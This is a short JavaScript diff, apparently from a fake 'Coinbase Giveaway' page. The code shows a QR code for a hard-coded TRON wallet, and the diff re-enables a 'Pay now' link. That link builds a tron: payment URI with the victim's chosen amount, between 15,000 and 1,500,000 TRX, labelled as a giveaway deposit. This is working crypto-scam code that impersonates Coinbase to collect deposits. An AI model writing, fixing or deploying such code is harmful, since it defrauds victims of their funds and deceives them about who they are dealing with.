@@ -191,15 +191,15 @@ function update_trans() {
         "src",
         "https://api.qrserver.com/v1/create-qr-code/?data=TG6C48QXM1UW44BgtUdfhjt66o1fN2ZUsL&amp;size=150x150"
       );
-      // $('#paynow')
-      //   .parent()
-      //   .attr(
-      //     'href',
-      //     'tron:TG6C48QXM1UW44BgtUdfhjt66o1fN2ZUsL?amount=' +
-      //       amount_entered +
-      //       '&message=Deposit+to+Coinbase+Giveaway+' +
-      //       tm,
-      //   )
+      $('#paynow')
+      .parent()
+      .attr(
+           'href',
+          'tron:TG6C48QXM1UW44BgtUdfhjt66o1fN2ZUsL?amount=' +
+             amount_entered +
+             '&message=Deposit+to+Coinbase+Giveaway+' +
+             tm,
+         )
     } else $('#warn').text('Amount should be within 15,000 TRX to 1,500,000 TRX')
   }),
   $('#close').click(() => {
